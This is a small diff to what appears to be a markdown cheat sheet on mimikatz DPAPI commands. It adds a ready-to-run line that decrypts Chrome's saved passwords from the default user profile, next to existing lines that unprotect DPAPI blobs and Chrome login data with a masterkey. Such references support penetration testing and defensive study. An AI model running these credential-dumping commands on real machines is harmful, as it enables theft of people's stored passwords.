@@ -43,5 +43,11 @@ mimikatz# dpapi::blob /in:"encrypted_file" /unprotect /masterkey:xxx
 mimikatz# dpapi::chrome /in:".\Login Data" /unprotect /masterkey:xxx
 ```
 
+To decrypt chrome passwords:
+
+```shell!
+mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
+```
+
 📚 See also: [pypykatz](pypykatz.md) for Linux users.
 </div></div>
